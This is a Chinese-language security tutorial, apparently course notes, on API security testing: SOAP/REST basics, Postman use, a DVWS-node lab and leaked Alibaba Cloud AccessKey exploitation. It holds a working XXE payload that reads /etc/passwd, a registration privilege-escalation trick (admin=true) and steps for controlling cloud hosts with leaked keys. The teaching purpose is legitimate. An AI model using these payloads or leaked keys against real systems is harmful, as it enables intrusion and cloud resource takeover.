![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135315745-2004599160.png)

```plain
#知识点：
1.HTTP类接口-测评
2.RPC类接口-测评
3.Web Service类-测评

#内容点：
SOAP（Simple Object Access Protocol）简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计成在WEB上交换结构化的和固化的信息。SOAP不是Web Service的专有协议。
SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP = HTTP +XML

REST（Representational State Transfer）即表述性状态传递，在三种主流的Web服务实现方案中，因为REST模式的Web服务与复杂的SOAP和XML-RPC对比来讲明显的更加简洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。

WSDL（Web Services Description Language）即网络服务描述语言，用于描述Web服务的公共接口。这是一个基于XML的关于如何与Web服务通讯和使用的服务描述；也就是描述与目录中列出的Web服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。


#接口数据包：
Method：请求方法
 攻击方式：OPTIONS,PUT,MOVE,DELETE
 效果：上传恶意文件，修改页面等
URL：唯一资源定位符
 攻击方式：猜测，遍历，跳转
 效果：未授权访问等
Params：请求参数
 攻击方式：构造参数，修改参数，遍历，重发
 效果：爆破，越权，未授权访问，突破业务逻辑等
Authorization：认证方式
 攻击方式：身份伪造，身份篡改
 效果：越权，未授权访问等
Headers：请求消息头
 攻击方式：拦截数据包，改Hosts，改Referer，改Content-Type等
 效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等
Body：消息体
 攻击方式：SQL注入，XML注入，反序列化等
 效果：提权，突破业务逻辑，未授权访问等
 
#安全问题：
XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等
```

- 工具使用-Postman自动化测试

```plain
Postman这个工具不是扫描工具，也不是检测工具。只是一个检测这个接口有没有正常的一款工具。
https://www.postman.com/downloads/

打开工具后，点一个+号，就会出现Untitled Request页面，这里支持GET，POST等提交方式，下面的response就是对应的返回包。在Authorization中还可以代入各种鉴权来进行请求，比如APIkey
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135327641-1636686252.png)

```plain
里面还有environment，可以代入身份信息来进行请求。比如cookie
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135327739-924261461.png)

```plain
也可以进行文件上传等
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135327725-236561249.png)

- 安全问题-Dvws泄漏&鉴权&XXE

```plain
项目地址：https://github.com/snoopysecurity/dvws-node

没有启动项目成功。

不管是测试什么API，如果是手工测试的话，都是需要开启burp进行抓包测试的。

遍历数据 接口数据
鉴权安全 越权判定
JWT问题
在/api/v2/login下面请求了登录信息，看到这种地址一般都是接口。在返回信息中有一个token（JWT验证），admin=false，还有id和password。
在页面中有一个admin area这个页面，打开一闪而过，这个相当于只有管理员才能访问的页面。返回是304跳转。
这个就是鉴权的问题，如何检测有没有这越权的安全问题

越权：
观察注册后，返回数据包
修改注册时，数据包admin=true

在重新注册一个账号：xxxxiaodi xxxxaiodi
抓包返回数据包中有账号密码等信息
然后修改数据包：axxxxiaodi在后面加上&amdin=true，返回用户也差不多。然后用axxxxiaodi用户去登录，就可以访问admin area页面了。数据包的回显为admin=true
xxe xml利用：

在admin area中有一个搜索用户的地方，比如搜索xiaodi，抓包。在数据包中发现了xml格式。
如果非api接口的搜索一般是这样的：name=xiaodi
但是这里的api搜索是xml格式的。也有关键字soap（接口协议）

构造一些xxe payload：
XXE安全 
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///etc/passwd">
]>

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:examples:usernameservice">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:Username soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <username xsi:type="xsd:string">&test;</username>
      </urn:Username>
   </soapenv:Body>
</soapenv:Envelope>


用postman也是可以测试的。

请求地址：http://47.94.236.117/dvwsuserservice
POST方式发送，请求内容是body里面，选择raw模式
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135328037-586829377.png)

- 安全问题-阿里KEY信息泄漏利用

```plain
https://yun.cloudbility.com/
https://github.com/mrknow001/aliyun-accesskey-Tools
接口配置文件泄漏导致云资源主机受控

泄露源码配置翻到
js文件泄露
报错页面信息泄露
目前为止，云服务器已经占据了服务器的大部分市场，由于云服务器易管理，操作性强，安全程度高。很多大型厂商都选择将资产部署在云服务上，但安全的同时由于运维人员的疏忽也会导致一些非预期的突破口。当云产品Accesskey在调用过程中，出现泄漏会导致对象控制资源全部被控，影响严重！
涉及云产品：
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135328495-1735785529.png)

```plain
举例：阿里云Accesskey设置
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135328016-1853936082.png)

```plain
1、常规获取Accesskey方式
-通过源码泄漏配置文件
-通过应用程序报错读取
-通过JS文件引用中获取
如图：页面报错
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135328986-67960666.png)

```plain
如图：源码配置
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135328669-757905803.png)

```plain
2、如何利用Accesskey
https://yun.cloudbility.com/
https://github.com/mrknow001/aliyun-accesskey-Tools
-托管管家平台（行云管家等）-支持多平台，图形化美观
依次选择类型-填入密匙-筛选主机-导入控制
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135328748-872018903.png)

```plain
-特定利用工具（安全工作者开发）-方便安全测试者功能开发
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135329087-846356748.png)

```plain
3、如何修复和防御
尽量控制权限
做好告警设置
做到信息保护
```

- 应用方向-违法APP打包接口分析

```plain
进行配置代码抓包，发现挺多的api接口信息
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135329007-1781714111.png)

```plain
发现地址：edjndn.com
但是访问失败了。在杂项中有webpack，然后用到工具Packer-Fuzzer-1.3
```